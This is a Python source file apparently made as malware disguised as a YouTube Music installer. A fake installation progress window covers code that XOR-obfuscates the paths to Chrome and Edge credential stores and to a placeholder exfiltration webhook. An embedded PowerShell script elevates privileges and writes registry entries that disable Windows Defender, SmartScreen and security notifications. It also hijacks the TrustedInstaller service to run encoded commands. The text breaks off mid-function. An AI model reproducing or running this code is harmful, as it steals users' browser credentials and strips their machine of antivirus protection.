import os
import sqlite3
import win32crypt
import win32security
import win32api
import win32com.client
import win32process
import base64
import time
import random
import threading
from shutil import copyfile
from pathlib import Path
from Cryptodome.Cipher import AES
import ctypes
import sys
import re
import hashlib
import json
import subprocess
import tkinter as tk
from tkinter import ttk

class InstallationWindow:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("YouTube Music Setup")
        self.root.geometry("600x400")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.overrideredirect(True)
        
        self.bg_color = '#0f0f0f'
        self.card_bg = '#1f1f1f'
        self.accent_color = '#ff0000'
        self.text_primary = '#ffffff'
        self.text_secondary = '#aaaaaa'
        
        self.root.configure(bg=self.bg_color)
        
        self.root.geometry("+{}+{}".format(
            (self.root.winfo_screenwidth() // 2) - 300,
            (self.root.winfo_screenheight() // 2) - 200
        ))
        
        self.setup_ui()
        self.installation_messages = [
            "Downloading YouTube Music...",
            "Extracting installation files...",
            "Installing YouTube Music Desktop App...",
            "Setting up audio codecs...",
            "Configuring media library...",
            "Creating desktop shortcuts...",
            "Registering music file associations...",
            "Finalizing YouTube Music installation...",
            "YouTube Music installed successfully!"
        ]
        self.current_message_index = 0
        self.progress_value = 0
        
    def setup_ui(self):
        main_frame = tk.Frame(self.root, bg=self.bg_color, padx=40, pady=40)
        main_frame.pack(fill='both', expand=True)
        
        header_frame = tk.Frame(main_frame, bg=self.bg_color)
        header_frame.pack(fill='x', pady=(0, 30))
        
        logo_frame = tk.Frame(header_frame, bg=self.bg_color)
        logo_frame.pack(side='left')
        
        logo_canvas = tk.Canvas(logo_frame, width=40, height=40, bg=self.bg_color, highlightthickness=0)
        logo_canvas.pack(side='left', padx=(0, 15))
        logo_canvas.create_oval(5, 5, 35, 35, fill=self.accent_color, outline='')
        logo_canvas.create_text(20, 20, text='♪', fill='white', font=('Arial', 16, 'bold'))
        
        title_label = tk.Label(
            header_frame, 
            text="YouTube Music", 
            font=("Segoe UI", 24, "bold"), 
            bg=self.bg_color,
            fg=self.text_primary
        )
        title_label.pack(side='left', anchor='center')
        
        card_frame = tk.Frame(main_frame, bg=self.card_bg, relief='flat', bd=0)
        card_frame.pack(fill='both', expand=True, pady=(0, 20))
        
        card_content = tk.Frame(card_frame, bg=self.card_bg, padx=30, pady=30)
        card_content.pack(fill='both', expand=True)
        
        install_title = tk.Label(
            card_content,
            text="Installing YouTube Music",
            font=("Segoe UI", 16, "bold"),
            bg=self.card_bg,
            fg=self.text_primary
        )
        install_title.pack(anchor='w', pady=(0, 10))
        
        self.status_label = tk.Label(
            card_content,
            text="Downloading YouTube Music...",
            font=("Segoe UI", 11),
            bg=self.card_bg,
            fg=self.text_secondary,
            anchor='w'
        )
        self.status_label.pack(fill='x', pady=(0, 20))
        
        progress_container = tk.Frame(card_content, bg=self.card_bg)
        progress_container.pack(fill='x', pady=(0, 20))
        
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Youtube.Horizontal.TProgressbar",
                       background=self.accent_color,
                       troughcolor='#404040',
                       borderwidth=0,
                       lightcolor=self.accent_color,
                       darkcolor=self.accent_color)
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(
            progress_container,
            variable=self.progress_var,
            maximum=100,
            mode='determinate',
            length=520,
            style="Youtube.Horizontal.TProgressbar"
        )
        self.progress_bar.pack(fill='x')
        
        self.percentage_label = tk.Label(
            card_content,
            text="0%",
            font=("Segoe UI", 10),
            bg=self.card_bg,
            fg=self.text_secondary
        )
        self.percentage_label.pack(anchor='e', pady=(5, 0))
        
        info_frame = tk.Frame(main_frame, bg=self.bg_color)
        info_frame.pack(fill='x', pady=(10, 0))
        
        info_label = tk.Label(
            info_frame,
            text="Please wait while we set up YouTube Music for you...",
            font=("Segoe UI", 9),
            bg=self.bg_color,
            fg=self.text_secondary
        )
        info_label.pack(anchor='center')
        
    def update_progress(self):
        if self.progress_value < 100:
            self.progress_value += 1
            self.progress_var.set(self.progress_value)
            self.percentage_label.config(text=f"{self.progress_value}%")
            message_progress = self.progress_value // 11
            if message_progress < len(self.installation_messages) and message_progress != self.current_message_index:
                self.current_message_index = message_progress
                self.status_label.config(text=self.installation_messages[message_progress])
            delay = 80 if self.progress_value < 30 else (120 if self.progress_value < 70 else 150)
            self.root.after(delay, self.update_progress)
        else:
            self.status_label.config(text="YouTube Music installed successfully!")
            self.percentage_label.config(text="100%")
            self.root.after(3000, self.root.destroy)
    
    def start_installation(self):
        self.update_progress()
    
    def run(self):
        self.root.after(500, self.start_installation)
        self.root.mainloop()

def load_libs():
    global requests, psutil, winreg, subprocess, comtypes, ctypes
    try:
        import requests
        import psutil
        import winreg
        import subprocess
        import comtypes
        return True
    except ImportError:
        return False

def xor_str(s, k=0x5F):
    return ''.join(chr(ord(c) ^ k) for c in s)

p1 = xor_str(r'%s\AppData\Local\Google\Chrome\User Data\Local State'%(os.environ['USERPROFILE']))
p2 = xor_str(r'%s\AppData\Local\Google\Chrome\User Data'%(os.environ['USERPROFILE']))
p3 = xor_str(r'%s\AppData\Local\Microsoft\Edge\User Data\Local State'%(os.environ['USERPROFILE']))
p4 = xor_str(r'%s\AppData\Local\Microsoft\Edge\User Data'%(os.environ['USERPROFILE']))
wh = xor_str('https://TU-Direcion.De/Lo-que-Quieras')

def random_sleep(min_sleep=0.1, max_sleep=0.5):
    time.sleep(random.uniform(min_sleep, max_sleep))

powershell_script = r'''
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
  Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
  Exit	
}

$file1 = @'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"DisableRoutinelyTakingAction"=dword:00000001
"ServiceKeepAlive"=dword:00000000
"AllowFastServiceStartup"=dword:00000000
"DisableLocalAdminMerge"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"LocalSettingOverrideDisableOnAccessProtection"=dword:00000000
"LocalSettingOverrideRealtimeScanDirection"=dword:00000000
"LocalSettingOverrideDisableIOAVProtection"=dword:00000000
"LocalSettingOverrideDisableBehaviorMonitoring"=dword:00000000
"LocalSettingOverrideDisableIntrusionPreventionSystem"=dword:00000000
"LocalSettingOverrideDisableRealtimeMonitoring"=dword:00000000
"DisableIOAVProtection"=dword:00000001
"DisableRealtimeMonitoring"=dword:00000001
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"RealtimeScanDirection"=dword:00000002
"DisableInformationProtectionControl"=dword:00000001
"DisableIntrusionPreventionSystem"=dword:00000001
"DisableRawWriteNotification"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowBehaviorMonitoring]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender]
"DisableRoutinelyTakingAction"=dword:00000001
'@
$file2 = @'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowIOAVProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
"PUAProtection"=dword:00000000
"DisableRoutinelyTakingAction"=dword:00000001
"ServiceKeepAlive"=dword:00000000
"AllowFastServiceStartup"=dword:00000000
"DisableLocalAdminMerge"=dword:00000001
"DisableAntiSpyware"=dword:00000001
"RandomizeScheduleTaskTimes"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowArchiveScanning]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowBehaviorMonitoring]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowCloudProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowEmailScanning]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowFullScanOnMappedNetworkDrives]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowFullScanRemovableDriveScanning]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowIntrusionPreventionSystem]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowOnAccessProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowRealtimeMonitoring]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowScanningNetworkFiles]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowScriptScanning]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\AllowUserUIAccess]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\CheckForSignaturesBeforeRunningScan]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\CloudBlockLevel]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\CloudExtendedTimeout]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\DaysToRetainCleanedMalware]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\DisableCatchupFullScan]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\DisableCatchupQuickScan]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\EnableControlledFolderAccess]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\EnableLowCPUPriority]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\EnableNetworkProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\PUAProtection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\RealTimeScanDirection]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\ScanParameter]
"value"=dword:00000002

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\ScheduleScanDay]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\ScheduleScanTime]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\SignatureUpdateInterval]
"value"=dword:00000018

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Defender\SubmitSamplesConsent]
"value"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions]
"DisableAutoExclusions"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\MpEngine]
"MpEnablePus"=dword:00000000
"MpCloudBlockLevel"=dword:00000000
"MpBafsExtendedTimeout"=dword:00000000
"EnableFileHashComputation"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\NIS\Consumers\IPS]
"ThrottleDetectionEventsRate"=dword:00000000
"DisableSignatureRetirement"=dword:00000001
"DisableProtocolRecognition"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager]
"DisableScanningNetworkFiles"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection]
"DisableRealtimeMonitoring"=dword:00000001
"DisableBehaviorMonitoring"=dword:00000001
"DisableOnAccessProtection"=dword:00000001
"DisableScanOnRealtimeEnable"=dword:00000001
"DisableIOAVProtection"=dword:00000001
"LocalSettingOverrideDisableOnAccessProtection"=dword:00000000
"LocalSettingOverrideRealtimeScanDirection"=dword:00000000
"LocalSettingOverrideDisableIOAVProtection"=dword:00000000
"LocalSettingOverrideDisableBehaviorMonitoring"=dword:00000000
"LocalSettingOverrideDisableIntrusionPreventionSystem"=dword:00000000
"LocalSettingOverrideDisableRealtimeMonitoring"=dword:00000000
"RealtimeScanDirection"=dword:00000002
"IOAVMaxSize"=dword:00000512
"DisableInformationProtectionControl"=dword:00000001
"DisableIntrusionPreventionSystem"=dword:00000001
"DisableRawWriteNotification"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Scan]
"LowCpuPriority"=dword:00000001
"DisableRestorePoint"=dword:00000001
"DisableArchiveScanning"=dword:00000000
"DisableScanningNetworkFiles"=dword:00000000
"DisableCatchupFullScan"=dword:00000000
"DisableCatchupQuickScan"=dword:00000001
"DisableEmailScanning"=dword:00000000
"DisableHeuristics"=dword:00000001
"DisableReparsePointScanning"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates]
"SignatureDisableNotification"=dword:00000001
"RealtimeSignatureDelivery"=dword:00000000
"ForceUpdateFromMU"=dword:00000000
"DisableScheduledSignatureUpdateOnBattery"=dword:00000001
"UpdateOnStartUp"=dword:00000000
"SignatureUpdateCatchupInterval"=dword:00000002
"DisableUpdateOnStartupWithoutEngine"=dword:00000001
"ScheduleTime"=dword:00001440
"DisableScanOnUpdate"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet]
"DisableBlockAtFirstSeen"=dword:00000001
"LocalSettingOverrideSpynetReporting"=dword:00000000
"SpynetReporting"=dword:00000000
"SubmitSamplesConsent"=dword:00000002

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration]
"SuppressRebootNotification"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access]
"EnableControlledFolderAccess"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection]
"EnableNetworkProtection"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender]
"DisableRoutinelyTakingAction"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware]
"ServiceKeepAlive"=dword:00000000
"AllowFastServiceStartup"=dword:00000000
"DisableRoutinelyTakingAction"=dword:00000001
"DisableAntiSpyware"=dword:00000001
"DisableAntiVirus"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware\SpyNet]
"SpyNetReporting"=dword:00000000
"LocalSettingOverrideSpyNetReporting"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting]
"DisableEnhancedNotifications"=dword:00000001
"DisableGenericRePorts"=dword:00000001
"WppTracingLevel"=dword:00000000
"WppTracingComponents"=dword:00000000

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\CI\Policy]
"VerifiedAndReputablePolicyState"=dword:00000000
'@
$file3 = @'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter\DisableEnhancedNotifications]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter\DisableNotifications]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\WindowsDefenderSecurityCenter\HideWindowsSecurityNotificationAreaControl]
"value"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center]
"FirstRunDisabled"=dword:00000001
"AntiVirusOverride"=dword:00000001
"FirewallOverride"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications]
"DisableEnhancedNotifications"=dword:00000001
"DisableNotifications"=dword:00000001

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance]
"Enabled"=dword:00000000
'@
$file5 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\Software\Classes\WOW6432Node\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{2781761E-28E2-4109-99FE-B9D127C57AFE}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{195B4D07-3DE2-4744-BBF2-D90121AE785B}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{361290c0-cb1b-49ae-9f3e-ba1cbe5dab35}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{45F2C32F-ED16-4C94-8493-D72EF93A051B}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{6CED0DAA-4CDE-49C9-BA3A-AE163DC3D7AF}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{8a696d12-576b-422e-9712-01b9dd84b446}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{8C9C0DB7-2CBA-40F1-AFE0-C55740DD91A0}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{A2D75874-6750-4931-94C1-C99D3BC9D0C7}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{A7C452EF-8E9F-42EB-9F2B-245613CA0DC9}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{DACA056E-216A-4FD1-84A6-C306A017ECEC}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{E3C9166D-1D39-4D4E-A45D-BC7BE9B00578}]

[-HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{F6976CF5-68A8-436C-975A-40BE53616D59}]

[-HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}]

[-HKEY_CLASSES_ROOT\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}]

[-HKEY_CLASSES_ROOT\CLSID\{2781761E-28E2-4109-99FE-B9D127C57AFE}]

[-HKEY_CLASSES_ROOT\CLSID\{195B4D07-3DE2-4744-BBF2-D90121AE785B}]

[-HKEY_CLASSES_ROOT\CLSID\{361290c0-cb1b-49ae-9f3e-ba1cbe5dab35}]

[-HKEY_CLASSES_ROOT\CLSID\{45F2C32F-ED16-4C94-8493-D72EF93A051B}]

[-HKEY_CLASSES_ROOT\CLSID\{6CED0DAA-4CDE-49C9-BA3A-AE163DC3D7AF}]

[-HKEY_CLASSES_ROOT\CLSID\{8a696d12-576b-422e-9712-01b9dd84b446}]

[-HKEY_CLASSES_ROOT\CLSID\{8C9C0DB7-2CBA-40F1-AFE0-C55740DD91A0}]

[-HKEY_CLASSES_ROOT\CLSID\{A2D75874-6750-4931-94C1-C99D3BC9D0C7}]

[-HKEY_CLASSES_ROOT\CLSID\{A7C452EF-8E9F-42EB-9F2B-245613CA0DC9}]

[-HKEY_CLASSES_ROOT\CLSID\{DACA056E-216A-4FD1-84A6-C306A017ECEC}]

[-HKEY_CLASSES_ROOT\CLSID\{E3C9166D-1D39-4D4E-A45D-BC7BE9B00578}]

[-HKEY_CLASSES_ROOT\CLSID\{F6976CF5-68A8-436C-975A-40BE53616D59}]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger]
'@
$file6 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{0ACC9108-2000-46C0-8407-5FD9F89521E8}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{1D77BCC8-1D07-42D0-8C89-3A98674DFB6F}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{4A9233DB-A7D3-45D6-B476-8C7D8DF73EB5}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{B05F34EE-83F2-413D-BC1D-7D5BD6E98300}]
'@
$file7 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsSecCore]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wscsvc]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\webthreatdefusersvc]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\webthreatdefsvc]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SgrmAgent]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SgrmBroker]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend]

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection]
"DisallowExploitProtectionOverride"=dword:00000001

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsSecFlt]

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsSecWfp]
'@
$file8 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend]

[-HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\windowsdefender]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppUserModelId\Windows.Defender]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\AppUserModelId\Microsoft.Windows.Defender]

[-HKEY_CLASSES_ROOT\AppX9kvz3rdv8t7twanaezbwfcdgrbg3bck0]

[-HKEY_CURRENT_USER\Software\Classes\ms-cxh]

[-HKEY_CLASSES_ROOT\Local Settings\MrtCache\C:%5CWindows%5CSystemApps%5CMicrosoft.Windows.AppRep.ChxApp_cw5n1h2txyewy%5Cresources.pri]

[-HKEY_CLASSES_ROOT\WindowsDefender]

[-HKEY_CURRENT_USER\Software\Classes\AppX9kvz3rdv8t7twanaezbwfcdgrbg3bck0]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WindowsDefender]

[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Ubpm]
"CriticalMaintenance_DefenderCleanup"=-
"CriticalMaintenance_DefenderVerification"=-

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Ubpm]
"CriticalMaintenance_DefenderCleanup"=-
"CriticalMaintenance_DefenderVerification"=-

[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Static\System]
"WindowsDefender-1"=-
"WindowsDefender-2"=-
"WindowsDefender-3"=-

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\RestrictedServices\Static\System]
"WindowsDefender-1"=-
"WindowsDefender-2"=-
"WindowsDefender-3"=-
'@
$file9 = @'
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates]
"SignatureDisableNotification"=dword:00000001
"RealtimeSignatureDelivery"=dword:00000000
"ForceUpdateFromMU"=dword:00000000
"DisableScheduledSignatureUpdateOnBattery"=dword:00000001
"UpdateOnStartUp"=dword:00000000
"SignatureUpdateCatchupInterval"=dword:00000002
"DisableUpdateOnStartupWithoutEngine"=dword:00000001
"ScheduleTime"=dword:00001440
"DisableScanOnUpdate"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System]
"EnableSmartScreen"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen]
"ConfigureAppInstallControlEnabled"=dword:00000001
"ConfigureAppInstallControl"="Anywhere"

[HKEY_CURRENT_USER\Software\Microsoft\Windows Security Health\State]
"AppAndBrowser_EdgeSmartScreenOff"=dword:00000001
"AppAndBrowser_StoreAppsSmartScreenOff"=dword:00000001
"AppAndBrowser_PuaSmartScreenOff"=dword:00000001
'@
$file10 = @'
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"Windows Defender"=-
"SecurityHealth"=-

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run]
"Windows Defender"=-
"SecurityHealth"=-

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"WindowsDefender"=-
"SecurityHealth"=-

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open]
"NoSmartScreen"=""

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\runas]
"NoSmartScreen"=""

[HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\runasuser]
"NoSmartScreen"=""

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SmartScreen.exe]
"Debugger"="systray.exe"
'@
$file11 = @'
Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Classes\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKEY_CLASSES_ROOT\CLSID\{E48B2549-D510-4A76-8A5F-FC126A6215F0}]

[-HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{E48B2549-D510-4A76-8A5F-FC126A6215F0}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E48B2549-D510-4A76-8A5F-FC126A6215F0}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{E48B2549-D510-4A76-8A5F-FC126A6215F0}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Microsoft.OneCore.WebThreatDefense.Service.UserSessionServiceManager]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Microsoft.OneCore.WebThreatDefense.ThreatExperienceManager.ThreatExperienceManager]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Microsoft.OneCore.WebThreatDefense.ThreatResponseEngine.ThreatDecisionEngine]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsRuntime\ActivatableClassId\Microsoft.OneCore.WebThreatDefense.Configuration.WTDUserSettings]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKEY_LOCAL_MACHINE\SOFTWARE\Classes\WOW6432Node\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]

[-HKLM\SOFTWARE\WOW6432Node\Classes\CLSID\{a463fcb9-6b1c-4e0d-a80b-a2ca7999e25d}]
'@

function Run-Trusted([String]$command) {
  Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
  $service = Get-WmiObject -Class Win32_Service -Filter "Name='TrustedInstaller'"
  $DefaultBinPath = $service.PathName
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  $base64Command = [Convert]::ToBase64String($bytes)
  sc.exe config TrustedInstaller binPath= "cmd.exe /c powershell.exe -encodedcommand $base64Command" | Out-Null
  sc.exe start TrustedInstaller | Out-Null
  sc.exe config TrustedInstaller binpath= "`"$DefaultBinPath`"" | Out-Null
